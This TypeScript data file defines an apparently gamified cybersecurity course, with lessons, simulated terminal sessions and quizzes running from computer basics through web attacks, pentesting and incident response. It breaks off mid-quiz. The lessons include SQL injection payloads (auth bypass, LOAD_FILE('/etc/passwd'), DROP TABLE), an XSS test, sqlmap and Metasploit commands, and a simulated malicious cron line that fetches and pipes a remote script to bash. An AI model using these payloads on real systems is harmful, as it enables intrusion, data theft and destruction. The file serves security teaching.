import { Stage } from '../types';

export const STAGES: Stage[] = [
  {
    id: 'it-zero', order: 0,
    title: 'How Computers Work',
    subtitle: 'Absolute Start',
    icon: '🖥️', color: '#6366f1',
    difficulty: 'zero', xpReward: 150,
    description: 'Learn how computers, processors, and memory work — the foundation of all IT.',
    skills: ['PC Architecture', 'Operating Systems', 'File Systems'],
    lessons: [
      {
        id: 'it-zero-l1', title: "What's Inside a Computer?", duration: 8, type: 'theory',
        content: `# What's Inside a Computer?

A computer is a machine that executes instructions.

## Processor (CPU)

**CPU** — the "brain" of the computer. Executes all calculations.

\`\`\`
Intel Core i7 = ~4,000,000,000 operations/sec
\`\`\`

The CPU:
- Reads instructions from memory
- Performs mathematical operations
- Makes decisions (if A > B, then...)

## RAM (Random Access Memory)

**RAM** — fast temporary memory for current tasks.

> Analogy: RAM is your desk where you work. The drive is your storage cabinet.

\`\`\`
Opened browser → data loaded into RAM
Shut down PC   → RAM cleared
\`\`\`

## Storage (SSD/HDD)

Persistent memory — data survives after shutdown.

| | SSD | HDD |
|--|-----|-----|
| Speed | 500–7000 MB/s | 80–160 MB/s |
| Reliability | High | Medium |

## Why Does This Matter for Security?

- Viruses **live** in RAM and **persist** on disk
- Forensics investigates data from disk
- Encryption protects data at rest
- Cold boot attacks steal data from RAM`,
      },
      {
        id: 'it-zero-l2', title: 'The Operating System', duration: 10, type: 'theory',
        content: `# The Operating System (OS)

The OS manages hardware and runs programs.

## What Does the OS Do?

\`\`\`
You press "A" on the keyboard
        ↓
Signal from keyboard
        ↓
OS kernel intercepts (interrupt)
        ↓
Passes character to active app
        ↓
Text editor shows "A"
\`\`\`

## Popular Operating Systems

### Linux 🐧
- 96% of internet servers
- Free and open source
- Powers Android, Kali Linux

### Windows 🪟
- 72% of desktop PCs
- Corporate standard

### macOS 🍎
- Based on Unix (like Linux)
- Apple devices only

## The Kernel

Manages memory, processes, files, and networking.

## Permissions & Security

\`\`\`
root/Administrator  → full access
Regular user        → restricted
Guest               → minimal rights
\`\`\`

> Principle of Least Privilege: give exactly the rights needed, nothing more.`,
      },
      {
        id: 'it-zero-quiz', title: 'Quiz: Computer Basics', duration: 5, type: 'quiz',
        quiz: [
          { id: 'q1', question: 'What happens to data in RAM when you shut down the computer?', options: ['Saved to disk', 'Erased', 'Moved to the cloud', 'Stays in the CPU'], correctIndex: 1, explanation: 'RAM is volatile memory. When power is cut, all data is destroyed. That is why saving files to disk matters.' },
          { id: 'q2', question: 'Where do viruses persist BETWEEN reboots?', options: ['RAM', 'CPU cache', 'SSD/HDD', 'GPU'], correctIndex: 2, explanation: 'Viruses save themselves to persistent storage (SSD/HDD) to survive reboots. While running, they load into RAM.' },
          { id: 'q3', question: 'What is the Principle of Least Privilege?', options: ['Give maximum rights', 'Give exactly the rights needed', 'Deny all rights', 'Rights only for admins'], correctIndex: 1, explanation: 'Least Privilege is a security foundation. If a program is compromised, minimal rights limit the damage.' },
          { id: 'q4', question: 'Which OS runs 96% of servers?', options: ['Windows Server', 'macOS', 'Linux', 'FreeBSD'], correctIndex: 2, explanation: 'Linux dominates servers thanks to reliability, open source code, and cost. Linux knowledge is essential for security professionals.' },
        ],
      },
    ],
  },

  {
    id: 'networks-101', order: 1,
    title: 'How the Internet Works',
    subtitle: 'Networks from Scratch',
    icon: '🌐', color: '#06b6d4',
    difficulty: 'beginner', xpReward: 200,
    requiresStage: 'it-zero',
    description: 'How data travels across the internet — IP, DNS, ports, and protocols.',
    skills: ['IP Addresses', 'DNS', 'HTTP/HTTPS', 'TCP/UDP', 'Ports'],
    lessons: [
      {
        id: 'net-l1', title: 'The Journey of Data', duration: 10, type: 'theory',
        content: `# How the Internet Works

## What happens when you open google.com?

\`\`\`
1. You type: google.com
2. DNS resolves it to IP: 142.250.185.46
3. Your device connects to the server by IP
4. Sends request: GET /
5. Server returns an HTML page
6. Browser renders the page
\`\`\`

All of this happens in **< 100 milliseconds!**

## IP Address

A unique address for every device on the network.

\`\`\`
IPv4: 192.168.1.1
IPv6: 2001:db8::1
\`\`\`

| Type | Range |
|------|-------|
| Private | 192.168.x.x |
| Private | 10.x.x.x |
| Public | Everything else |

## DNS — the Internet's Phone Book

\`\`\`
google.com  → 142.250.185.46
youtube.com → 216.58.215.110
\`\`\`

> DNS Spoofing attack: an attacker forges the DNS reply — you end up on a fake site!

## Ports — Doors to the House

IP is the house address; a port is the specific door.

\`\`\`
:443 → HTTPS (encrypted web)
:80  → HTTP (unencrypted)
:22  → SSH (remote access)
:3306→ MySQL (database)
\`\`\`

> An unnecessary open port = a vulnerability. Close everything unused!

## HTTP vs HTTPS

\`\`\`
HTTP  → data visible to everyone on the network
HTTPS → data encrypted with TLS
\`\`\`

Always check 🔒 before entering a password!`,
      },
      {
        id: 'net-term', title: 'Practice: Network Commands', duration: 15, type: 'terminal',
        terminal: {
          intro: 'Learn the core network commands — every IT professional and hacker knows these.',
          goal: 'Run all 5 network commands',
          steps: [
            { cmd: 'ping google.com', output: 'PING google.com (142.250.185.46)\n64 bytes: icmp_seq=1 time=12.4 ms\n64 bytes: icmp_seq=2 time=11.8 ms\n64 bytes: icmp_seq=3 time=12.1 ms\n3 packets transmitted, 0% packet loss', hint: 'ping checks host reachability and round-trip time (RTT). Essential for diagnosing connectivity.' },
            { cmd: 'nslookup google.com', output: 'Server: 8.8.8.8 (Google DNS)\n\nName:    google.com\nAddress: 142.250.185.46', hint: 'nslookup queries the DNS server. Port 53 is the standard DNS port.' },
            { cmd: 'netstat -tulpn', output: 'Proto  Local Address     State\ntcp    0.0.0.0:22        LISTEN  (sshd)\ntcp    0.0.0.0:80        LISTEN  (nginx)\ntcp    0.0.0.0:443       LISTEN  (nginx)\ntcp    127.0.0.1:3306    LISTEN  (mysqld)', hint: 'MySQL on 127.0.0.1 is correct (local only). If it showed 0.0.0.0:3306 that would be a critical vulnerability!' },
            { cmd: 'traceroute google.com', output: ' 1  192.168.1.1 (router) 1.2 ms\n 2  10.0.0.1 (ISP) 8.4 ms\n 3  213.180.193.1 (backbone) 11.2 ms\n 4  142.250.185.46 (google.com) 12.4 ms', hint: 'traceroute shows the packet path. Each line is a router along the way.' },
            { cmd: 'curl -I https://google.com', output: 'HTTP/2 301\nlocation: https://www.google.com/\nserver: gws\nx-xss-protection: 0\nx-frame-options: SAMEORIGIN', hint: 'curl -I shows HTTP headers. "server: gws" reveals the Google server type — useful for recon.' },
          ],
        },
      },
      {
        id: 'net-quiz', title: 'Quiz: Networking', duration: 6, type: 'quiz',
        quiz: [
          { id: 'nq1', question: 'What does DNS do?', options: ['Encrypts traffic', 'Translates domain names to IP addresses', 'Assigns IP to devices', 'Filters traffic'], correctIndex: 1, explanation: 'DNS translates human-readable names (google.com) into IP addresses (142.250.185.46) that computers understand.' },
          { id: 'nq2', question: 'Which port does HTTPS use?', options: ['80', '22', '443', '3306'], correctIndex: 2, explanation: 'HTTPS uses port 443. HTTP is 80. SSH is 22. MySQL is 3306. Knowing ports is critical for pentesting and administration.' },
          { id: 'nq3', question: 'Why is port 3306 open to the internet dangerous?', options: ['Slows down the website', 'Direct access to the database from the internet', 'Blocks HTTPS', 'Not dangerous'], correctIndex: 1, explanation: 'Port 3306 (MySQL) should only be accessible locally (127.0.0.1). Open to the internet means direct attacks on the database containing user passwords.' },
          { id: 'nq4', question: 'What is a SYN flood?', options: ['Password cracking', 'DDoS via thousands of incomplete TCP connections', 'DNS spoofing', 'SQL injection'], correctIndex: 1, explanation: 'A SYN flood exhausts server resources with half-open connections. The server crashes — this attacks Availability (the A in the CIA triad).' },
        ],
      },
    ],
  },

  {
    id: 'linux-basics', order: 2,
    title: 'Linux from Scratch',
    subtitle: 'Command Line',
    icon: '🐧', color: '#22c55e',
    difficulty: 'beginner', xpReward: 250,
    requiresStage: 'networks-101',
    description: 'Linux powers everything. 96% of servers, Kali Linux, Android — it all runs on Linux.',
    skills: ['File System', 'Basic Commands', 'Permissions', 'Users'],
    lessons: [
      {
        id: 'linux-l1', title: 'Why Linux and the Terminal', duration: 8, type: 'theory',
        content: `# Linux and the Command Line

## Why Learn Linux?

\`\`\`
96% of internet servers    → Linux
Kali Linux (hacker's tool) → Linux
Android                    → based on Linux
All cloud servers          → Linux
\`\`\`

You cannot work in security without Linux.

## Linux File System

\`\`\`
/                   ← system root
├── /home/user/     ← your files
├── /etc/           ← system config
├── /var/log/       ← event logs
├── /tmp/           ← temp files
├── /bin/           ← system programs
├── /etc/passwd     ← user list
└── /etc/shadow     ← password hashes (root only!)
\`\`\`

> In Linux EVERYTHING is a file. Disks, network, devices — all represented as files.

## File Permissions

\`\`\`
ls -la secret.txt
-rw-r--r-- 1 alice users secret.txt
 │└┬┘└┬┘└┬┘
 │ │  │  └── Others: r (read)
 │ │  └───── Group: r
 │ └──────── Owner: rw (read+write)
 └────────── Type: - file, d directory
\`\`\`

Numeric permissions:
\`\`\`
r=4  w=2  x=1

chmod 755 = rwxr-xr-x
chmod 600 = rw------- (SSH keys!)
chmod 777 = rwxrwxrwx (DANGEROUS!)
\`\`\``,
      },
      {
        id: 'linux-term', title: 'Practice: Working in the Terminal', duration: 20, type: 'terminal',
        terminal: {
          intro: 'Your first real terminal session. Run commands and study the output.',
          goal: 'Master 6 essential Linux commands',
          steps: [
            { cmd: 'pwd', output: '/home/student', hint: 'pwd — shows where you are right now. Always start here to get your bearings.' },
            { cmd: 'ls -la', output: 'drwxr-xr-x  student\n-rw-r--r--  readme.txt\n-rw-------  secret.key\ndrwxr-xr-x  documents', hint: 'ls -la shows ALL files with permissions. secret.key has 600 permissions — only the owner can read it.' },
            { cmd: 'cat /etc/passwd', output: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:/var/www:/usr/sbin/nologin\nstudent:x:1000:1000:/home/student:/bin/bash\n# "x" = password stored in /etc/shadow', hint: '/etc/passwd lists users. UID 0 = root. Passwords are in /etc/shadow (root access only).' },
            { cmd: 'id', output: 'uid=1000(student) gid=1000(student) groups=1000(student),27(sudo)', hint: 'id shows your current user ID. You see "sudo"? You can run commands as administrator.' },
            { cmd: 'ps aux', output: 'USER     PID  COMMAND\nroot       1  /sbin/init\nroot     234  /usr/sbin/sshd\nwww-data 891  /usr/sbin/nginx\nstudent 1234  bash\nmysql    567  /usr/sbin/mysqld', hint: 'ps aux shows all running processes. Hackers hide malicious processes — you need to know how to spot them.' },
            { cmd: 'find / -perm -4000 2>/dev/null', output: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n# SUID files — run with owner privileges!', hint: 'SUID files execute with the file owner\'s privileges (often root). If vulnerable — a privilege escalation vector!' },
          ],
        },
      },
      {
        id: 'linux-quiz', title: 'Quiz: Linux', duration: 5, type: 'quiz',
        quiz: [
          { id: 'lq1', question: 'Where are password hashes stored in Linux?', options: ['/etc/passwd', '/etc/shadow', '/home/passwords', '/var/log/auth.log'], correctIndex: 1, explanation: '/etc/shadow contains password hashes and is only accessible by root. /etc/passwd holds user metadata and is world-readable.' },
          { id: 'lq2', question: 'What does chmod 600 mean?', options: ['Everyone can read and write', 'Only owner can read and write', 'Everyone can read', 'Owner can execute'], correctIndex: 1, explanation: '600 = rw------- — owner only. Perfect for SSH keys. SSH will refuse to connect if key permissions are not 600!' },
          { id: 'lq3', question: 'Why is the SUID bit dangerous?', options: ['Slows down the file', 'File runs with the owner\'s privileges (often root)', 'Makes the file invisible', 'Prevents writes'], correctIndex: 1, explanation: 'SUID lets a file run with its owner\'s privileges. If a SUID file owned by root is vulnerable, an attacker gains root access.' },
        ],
      },
    ],
  },

  {
    id: 'security-101', order: 3,
    title: 'Cybersecurity 101',
    subtitle: 'What We Protect and From Whom',
    icon: '🛡️', color: '#f59e0b',
    difficulty: 'beginner', xpReward: 300,
    requiresStage: 'linux-basics',
    description: 'The CIA triad, threat types, social engineering — the foundations of information security.',
    skills: ['CIA Triad', 'Threat Types', 'Social Engineering', 'Phishing', 'MFA'],
    lessons: [
      {
        id: 'sec-l1', title: 'The CIA Triad', duration: 10, type: 'theory',
        content: `# Information Security Fundamentals

## The CIA Triad — Foundation of InfoSec

\`\`\`
Confidentiality → Only authorized people see data
Integrity       → Data is not altered without permission
Availability    → Services are up when needed
\`\`\`

### 🔐 Confidentiality
Only authorized people can access data.

\`\`\`
Violation: attacker reads private messages
Defense:   encryption (AES, TLS, E2E)
\`\`\`

### ✅ Integrity
Data has not been altered without authorization.

\`\`\`
Violation: attacker changes transfer amount
Defense:   digital signatures, SHA-256 hashes
\`\`\`

### ⚡ Availability
The service works when it is needed.

\`\`\`
Violation: DDoS attack takes down a bank website
Defense:   redundancy, CDN, WAF
\`\`\`

## Types of Threat Actors

| Type | Motivation |
|------|------------|
| Script Kiddie | Fun |
| Hacktivist | Ideology |
| Cybercriminal | Money |
| APT (Nation-state) | Espionage |
| Insider | Revenge/money |

## Attack Surface

\`\`\`
Physical: USB drives, server room, printers
Digital:  open ports, APIs, web apps
Social:   employees (phishing, phone calls)
\`\`\`

> Reduce your attack surface. Close everything unnecessary.`,
      },
      {
        id: 'sec-l2', title: 'Social Engineering', duration: 12, type: 'theory',
        content: `# Social Engineering

**93% of breaches start with a human.**

## Types of Attacks

### 🎣 Phishing
\`\`\`
From: support@paypa1.com  ← not paypal!
Subject: Your account is locked!

Sign in: http://paypa1.com/login
\`\`\`

### 🎯 Spear Phishing (Targeted)
\`\`\`
Attacker researches LinkedIn → learns CEO name
Email to accountant "from CEO":
"Urgent wire transfer needed. $50,000.
Confidential!"
\`\`\`

### 📞 Vishing (Phone)
\`\`\`
"This is your bank's security department.
Your card has been blocked.
Please confirm your PIN..."
\`\`\`

## 6 Psychological Triggers

\`\`\`
Urgency:    "Only 5 minutes left!"
Fear:       "Your account was hacked!"
Authority:  "This is the IRS calling"
Greed:      "You've won a prize!"
Scarcity:   "Last spot available!"
Trust:      Impersonates a colleague
\`\`\`

## Defense

\`\`\`
✓ Check the domain (the actual URL, not the display name)
✓ Never enter passwords via links in emails
✓ Call back using the official phone number
✓ 2FA/MFA protects even if your password is stolen
✓ Pause and think — urgency is created intentionally
\`\`\``,
      },
      {
        id: 'sec-quiz', title: 'Quiz: Security Fundamentals', duration: 7, type: 'quiz',
        quiz: [
          { id: 'sq1', question: 'A DDoS attack violates which CIA principle?', options: ['Confidentiality', 'Integrity', 'Availability', 'All three'], correctIndex: 2, explanation: 'DDoS (Distributed Denial of Service) attacks Availability — the service is overloaded and becomes inaccessible to legitimate users.' },
          { id: 'sq2', question: 'You receive an email "from the CEO" asking for an urgent wire transfer. What do you do?', options: ['Execute immediately', 'Reply to the email', 'Call the CEO on a known number', 'Forward to accounting'], correctIndex: 2, explanation: 'BEC (Business Email Compromise) is a real attack. Always verify financial requests through an independent channel. Call using a known number — not one in the email.' },
          { id: 'sq3', question: "A file's hash changed. What does this mean?", options: ['Someone viewed the file', 'The file was copied', 'The file was modified', 'The file was encrypted'], correctIndex: 2, explanation: 'A hash is the unique fingerprint of a file. Any change produces a completely different hash. This is how viruses and unauthorized changes are detected.' },
          { id: 'sq4', question: 'Why does 2FA help against phishing?', options: ['Makes the password longer', 'Encrypts traffic', 'Second factor protects even with a stolen password', 'Blocks phishing sites'], correctIndex: 2, explanation: 'MFA requires a second factor (authenticator app). Even knowing your password, an attacker cannot log in without physical access to your phone.' },
        ],
      },
    ],
  },

  {
    id: 'web-security', order: 4,
    title: 'Web Security',
    subtitle: 'OWASP Top 10',
    icon: '🔓', color: '#ef4444',
    difficulty: 'intermediate', xpReward: 400,
    requiresStage: 'security-101',
    description: 'SQL injection, XSS, CSRF — attacks on web applications and how to defend against them.',
    skills: ['SQL Injection', 'XSS', 'CSRF', 'Burp Suite', 'OWASP Top 10'],
    lessons: [
      {
        id: 'web-l1', title: 'SQL Injection', duration: 15, type: 'theory',
        content: `# SQL Injection

## How Does It Work?

Vulnerable code:
\`\`\`python
# DANGEROUS!
query = "SELECT * FROM users WHERE " +
        "username = '" + username + "'"
db.execute(query)
\`\`\`

Normal input: alice
\`\`\`sql
WHERE username = 'alice'
\`\`\`

Malicious input: ' OR '1'='1
\`\`\`sql
WHERE username = '' OR '1'='1'
-- '1'='1' is always true → authentication bypass!
\`\`\`

## What an Attacker Can Do

\`\`\`sql
-- Bypass authentication
' OR '1'='1

-- Dump all data
' UNION SELECT * FROM users--

-- Read server files
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Drop a table
'; DROP TABLE users;--
\`\`\`

## Defense

\`\`\`python
# SAFE — parameterized queries
cursor.execute(
  "SELECT * FROM users WHERE username = ?",
  (username,)
)

# Or use an ORM:
User.objects.filter(username=username)
\`\`\`

> Tool: **sqlmap** — automatically discovers SQL injection vulnerabilities`,
      },
      {
        id: 'web-term', title: 'Practice: Finding Vulnerabilities', duration: 20, type: 'terminal',
        terminal: {
          intro: 'Simulating a web vulnerability assessment. This is a legal security audit.',
          goal: 'Find vulnerabilities in a training web application',
          steps: [
            { cmd: "curl \"http://lab.local/login?user=admin'--\"", output: '{"status":"logged_in","user":"admin","role":"administrator"}\n# Authentication bypassed via SQL injection!', hint: "The ' closed the string, -- commented out the password check. One character = full access!" },
            { cmd: 'nikto -h http://lab.local', output: '+ Server: Apache/2.4.41 Ubuntu\n+ /admin/: Admin login page found!\n+ /config/: Directory indexing enabled\n+ /phpinfo.php: phpinfo() disclosed!\n+ X-Frame-Options: not present (Clickjacking risk)', hint: 'nikto scans for web vulnerabilities. phpinfo.php exposes server configuration to attackers.' },
            { cmd: 'sqlmap -u "http://lab.local/users?id=1" --dbs', output: '[+] GET parameter "id" is VULNERABLE!\n[+] Databases:\n    * information_schema\n    * webapp_db\n    * users_data', hint: 'sqlmap found SQL injection and enumerated all databases. See users_data? That\'s where passwords live.' },
            { cmd: "curl -X POST http://lab.local/comment -d 'text=<script>alert(1)</script>'", output: '{"status":"ok","comment":"<script>alert(1)</script>"}\n# XSS stored without escaping!\n# Every reader will execute this script', hint: 'Stored XSS: the server saved the script to the DB. The correct response would be &lt;script&gt; (HTML encoding).' },
            { cmd: 'gobuster dir -u http://lab.local -w common.txt', output: '/admin   → 200 OK\n/.git    → 200 OK  ← critical!\n/backup  → 200 OK  ← dangerous!\n/config  → 403', hint: 'Open /.git means the full source code is downloadable — including passwords in the commit history!' },
          ],
        },
      },
      {
        id: 'web-quiz', title: 'Quiz: Web Security', duration: 7, type: 'quiz',
        quiz: [
          { id: 'wq1', question: "What happens when you enter ' OR '1'='1 in a vulnerable login form?", options: ['XSS attack', 'Authentication bypass via SQL injection', 'Server DDoS', 'Nothing'], correctIndex: 1, explanation: "Classic SQL injection. WHERE username='' OR '1'='1' — the condition is always true, login without a password." },
          { id: 'wq2', question: 'Why is Stored XSS more dangerous than Reflected XSS?', options: ['Only works on Linux', 'Stored in DB and attacks every visitor', 'Harder to write', 'Uses SQL'], correctIndex: 1, explanation: 'Stored XSS is saved in the database. Every user who opens the page becomes a victim automatically.' },
          { id: 'wq3', question: 'What are parameterized queries?', options: ['Faster queries', 'A defense against SQL injection', 'Data compression', 'Query caching'], correctIndex: 1, explanation: 'Parameterized queries separate SQL code from data, preventing user input from altering the query structure.' },
        ],
      },
    ],
  },

  {
    id: 'cryptography', order: 5,
    title: 'Cryptography',
    subtitle: 'Encryption & Hashing',
    icon: '🔑', color: '#a855f7',
    difficulty: 'intermediate', xpReward: 350,
    requiresStage: 'security-101',
    description: 'AES, RSA, hashes, TLS — the math that guards your data.',
    skills: ['AES/RSA', 'Hash Functions', 'TLS/HTTPS', 'PKI', 'Bcrypt'],
    lessons: [
      {
        id: 'crypto-l1', title: 'Symmetric vs Asymmetric Encryption', duration: 14, type: 'theory',
        content: `# Cryptography

## Why Do We Need Encryption?

\`\`\`
Without encryption:
Alice → "Password: secret123" → everyone can read it

With encryption:
Alice → "K3$#mX9@!" → only Bob can decrypt it
\`\`\`

## Symmetric Encryption

One key encrypts and decrypts.

\`\`\`
"Hello!" + Key K → "X7#@k!"
"X7#@k!" + Key K → "Hello!"
\`\`\`

**AES-256** — the modern standard. Extremely fast.

Problem: how do you safely share the key?

## Asymmetric Encryption

Two keys: public (everyone knows it) + private (only you).

\`\`\`
Bob publishes his public key 🔓
Alice encrypts a message with it
Only Bob can decrypt with his private key 🔐
\`\`\`

**RSA, ECDSA, Ed25519** — popular algorithms.

~1000x slower than symmetric encryption.

## How HTTPS (TLS) Works

\`\`\`
1. Browser → Server: "I want HTTPS"
2. Server → Browser: certificate (public key)
3. Browser verifies certificate with a CA
4. Browser generates a session AES key
5. Encrypts it with the server's public key
6. Both sides know the AES key → fast encryption
\`\`\`

## Hash Functions

Data → hash. Cannot be reversed.

\`\`\`
SHA-256("password") = "5e884898..."
SHA-256("Password") = "0b14d501..."
# One letter → completely different hash!
\`\`\`

Storing passwords:
\`\`\`python
# BAD: MD5 — cracked in seconds
stored = md5("password123")

# GOOD: bcrypt with salt
import bcrypt
hashed = bcrypt.hashpw(password, bcrypt.gensalt(12))
\`\`\``,
      },
      {
        id: 'crypto-quiz', title: 'Quiz: Cryptography', duration: 6, type: 'quiz',
        quiz: [
          { id: 'cq1', question: 'Why should you never store passwords with MD5?', options: ['MD5 is too slow', 'MD5 can be decrypted', 'MD5 is fast — billions/sec + rainbow tables exist', 'MD5 is not supported'], correctIndex: 2, explanation: 'GPUs can compute 10 billion MD5 hashes/sec. Rainbow tables store hashes for billions of passwords. Use bcrypt/Argon2 — they are intentionally slow.' },
          { id: 'cq2', question: 'What does HTTPS use asymmetric encryption for?', options: ['Encrypting all traffic', 'Only for exchanging the AES session key', 'Verifying passwords', 'Blocking viruses'], correctIndex: 1, explanation: 'The TLS handshake uses RSA/ECDH to securely exchange an AES key. Then all traffic is encrypted with fast AES — hybrid encryption.' },
          { id: 'cq3', question: 'What is a "salt" in password storage?', options: ['A second password', 'Random data added to the password before hashing', 'An encryption algorithm', 'A secret key'], correctIndex: 1, explanation: 'Salt makes each hash unique per user. Two identical passwords produce different hashes. Rainbow tables become useless.' },
        ],
      },
    ],
  },

  {
    id: 'pentest-basics', order: 6,
    title: 'Ethical Hacking',
    subtitle: 'Pentest Methodology',
    icon: '⚔️', color: '#f97316',
    difficulty: 'advanced', xpReward: 500,
    requiresStage: 'web-security',
    description: 'OSINT, scanning, exploitation, post-exploitation — how a hacker thinks.',
    skills: ['OSINT', 'Nmap', 'Metasploit', 'Burp Suite', 'Privilege Escalation'],
    lessons: [
      {
        id: 'pt-l1', title: 'Pentest Methodology', duration: 15, type: 'theory',
        content: `# Ethical Hacking

## What Is a Pentest?

A legal simulated attack to find vulnerabilities BEFORE a real attacker does.

\`\`\`
Black Box  → hacker with no system knowledge (realistic)
Grey Box   → partial information provided
White Box  → full code access (deep audit)
\`\`\`

## 5 Phases (PTES)

### 1. 📋 Reconnaissance (OSINT)
\`\`\`
Passive (target doesn't know):
- Google: site:company.com filetype:pdf
- LinkedIn: employees, tech stack
- Shodan: open ports of the company
- WHOIS: admin contacts

Active:
- nmap scanning
- DNS subdomain enumeration
\`\`\`

### 2. 🔍 Scanning
\`\`\`bash
nmap -sV -sC -p- target.com
gobuster dir -u http://target.com -w list.txt
nikto -h target.com
\`\`\`

### 3. ⚔️ Exploitation
\`\`\`bash
# Metasploit
use exploit/windows/smb/ms17_010
set RHOSTS 192.168.1.10
run → shell!
\`\`\`

### 4. 🏠 Post-Exploitation
\`\`\`bash
sudo -l            # what can we run with sudo?
find / -perm -4000 # SUID files
\`\`\`

### 5. 📄 Report
- Vulnerabilities with CVSS severity
- Proof of Concept
- Remediation recommendations

## Legality!

\`\`\`
✓ ALWAYS get written authorization
✓ Document every step
✗ Attacking without permission = criminal offense
\`\`\`

## Career: Red Team

Certifications: eJPT → CEH → OSCP → CRTO`,
      },
      {
        id: 'pt-term', title: 'Practice: Target Reconnaissance', duration: 25, type: 'terminal',
        terminal: {
          intro: 'Simulating the first phases of a pentest — reconnaissance and scanning a training target.',
          goal: 'Complete full recon and build an attack map',
          steps: [
            { cmd: 'whois target-corp.com', output: 'Domain: target-corp.com\nRegistrar: GoDaddy\nAdmin: admin@target-corp.com\nName Servers: ns1.target-corp.com (195.123.1.1)', hint: 'WHOIS gives contacts (phishing targets) and DNS info. Passive recon — the target has no idea.' },
            { cmd: 'nmap -sV -sC -p 1-1000 195.123.1.1', output: 'PORT    STATE  SERVICE   VERSION\n22/tcp  open   ssh       OpenSSH 7.4\n80/tcp  open   http      Apache 2.4.6\n8080/tcp open  http      Tomcat 9.0.12\n3306/tcp open  mysql     MySQL 5.6.45', hint: 'Tomcat 9.0.12 has known CVEs! MySQL exposed on port 3306 — a critical misconfiguration!' },
            { cmd: 'gobuster dir -u http://195.123.1.1 -w common.txt', output: '/admin  → 200 OK\n/backup → 200 OK  ← !\n/.git   → 200 OK  ← critical!\n/uploads→ 200 OK', hint: 'Found /.git! That means the full source code — including commit history with passwords — is accessible.' },
            { cmd: 'curl http://195.123.1.1/.git/config', output: '[remote "origin"]\n  url = https://github.com/target-corp/webapp.git\n  fetch = +refs/heads/*:refs/remotes/origin/*', hint: '.git/config reveals the private repo. We can download the full source code with API keys and hardcoded secrets!' },
            { cmd: 'searchsploit apache tomcat 9.0', output: 'Tomcat 9.0.x < 9.0.31 - Ghostcat RCE | CVE-2020-1938\nTomcat 9.0.0 < 9.0.17 - Info Disclosure | CVE-2019-0221', hint: 'Ghostcat (CVE-2020-1938) reads files and executes code on Tomcat 9.0.12. This is our attack vector!' },
          ],
        },
      },
      {
        id: 'pt-quiz', title: 'Quiz: Ethical Hacking', duration: 6, type: 'quiz',
        quiz: [
          { id: 'ptq1', question: 'What is the difference between Black Box and White Box testing?', options: ['Black box is more expensive', 'Black box has no system knowledge; White box has full code access', 'Only for different OS', 'They are the same'], correctIndex: 1, explanation: 'Black box simulates a real external attacker. White box provides full code access and finds the maximum number of vulnerabilities.' },
          { id: 'ptq2', question: 'An open /.git on a web server is:', options: ['Normal', 'A critical vulnerability — full code with secrets', 'Slows down the site', 'A security feature'], correctIndex: 1, explanation: 'Open /.git allows downloading the full source code with history. Passwords, API keys, and secrets are regularly found this way.' },
          { id: 'ptq3', question: 'What is REQUIRED before starting a pentest?', options: ['Kali Linux', 'A Shodan subscription', 'Written authorization from the system owner', 'A HackerOne account'], correctIndex: 2, explanation: 'Without written authorization a pentest is a criminal offense. A scope of work protects both parties.' },
        ],
      },
    ],
  },

  {
    id: 'blue-team', order: 7,
    title: 'Blue Team: Defense',
    subtitle: 'SIEM & Incident Response',
    icon: '🛡️', color: '#3b82f6',
    difficulty: 'advanced', xpReward: 500,
    requiresStage: 'cryptography',
    description: 'SIEM, log analysis, Incident Response, MITRE ATT&CK — you are on the defense.',
    skills: ['SIEM', 'Log Analysis', 'Incident Response', 'MITRE ATT&CK', 'Threat Hunting'],
    lessons: [
      {
        id: 'bt-l1', title: 'SIEM and Monitoring', duration: 15, type: 'theory',
        content: `# Blue Team: Defense

## SIEM — Security Operations Center

SIEM collects logs and detects anomalies:

\`\`\`
Firewall + Servers + Antivirus + EDR
                 ↓
              SIEM
                 ↓
"3 failed logins + success from new IP
= suspicious! → Alert!"
\`\`\`

Popular tools: **Splunk**, **Elastic/ELK**, **Wazuh** (Open Source)

## What to Look For in Logs

### Windows Event Log:
\`\`\`
4624 → Successful login
4625 → Failed login (many = brute force!)
4720 → New user created
4728 → Added to privileged group
7045 → New service installed (malware!)
\`\`\`

### Linux logs:
\`\`\`bash
/var/log/auth.log   # SSH, sudo, logins
/var/log/syslog     # System events

# Find SSH brute force:
grep "Failed password" /var/log/auth.log |
awk '{print $11}' | sort | uniq -c | sort -rn
\`\`\`

## MITRE ATT&CK

A knowledge base of real attacker techniques:

\`\`\`
Initial Access  → T1566 Phishing
Execution       → T1059 PowerShell
Persistence     → T1053 Cron/Tasks
Priv Escalation → T1068 Exploit
Exfiltration    → T1048 DNS tunnel
\`\`\`

## Incident Response (NIST)

\`\`\`
1. Preparation  → IR plan, tools
2. Detection    → SIEM alert
3. Containment  → isolate the host
4. Eradication  → remove malware
5. Recovery     → restore services
6. Lessons      → how to improve defenses
\`\`\``,
      },
      {
        id: 'bt-term', title: 'Practice: Investigating a Breach', duration: 25, type: 'terminal',
        terminal: {
          intro: 'ALERT: suspicious activity detected on server prod-web-01. Investigate the incident.',
          goal: 'Find traces of the attack and determine what the hacker did',
          steps: [
            { cmd: 'grep "Failed password" /var/log/auth.log | wc -l', output: '847\n# 847 failed SSH login attempts!\n# This is a brute force attack!', hint: 'wc -l counts lines. 847 attempts is clearly a brute force. Now find which IP did it.' },
            { cmd: "grep 'Accepted password' /var/log/auth.log", output: 'Jun 30 03:27:44 sshd: Accepted password for admin from 185.234.219.5\n# Successful login at 3am from an external IP!', hint: 'After 847 attempts — password found. IP 185.234.219.5 is the attacker. 3am is not a business hour.' },
            { cmd: 'find / -newer /tmp/marker -type f 2>/dev/null', output: '/tmp/.hidden_backdoor/srv\n/etc/cron.d/update-checker\n/usr/local/bin/sysupdate\n/var/www/html/uploads/shell.php', hint: 'Found it! A backdoor, cron job, and web shell — signs of post-exploitation.' },
            { cmd: 'cat /etc/cron.d/update-checker', output: '# System update\n* * * * * root curl -s http://185.234.219.5/cmd.sh | bash\n# Downloads attacker commands every minute!', hint: 'Malware downloads a shell script from the attacker every minute. This is a C2 (Command & Control) channel via cron.' },
            { cmd: "ss -tulpn | grep 185.234.219.5", output: 'tcp ESTAB 0 0 10.0.0.5:443 185.234.219.5:9001 ("sysupdate",pid=3847)\n# Active connection to the attacker!', hint: 'sysupdate maintains a connection to the attacker. PID 3847 — kill it! Then isolate the host from the network.' },
          ],
        },
      },
      {
        id: 'bt-quiz', title: 'Quiz: Blue Team', duration: 6, type: 'quiz',
        quiz: [
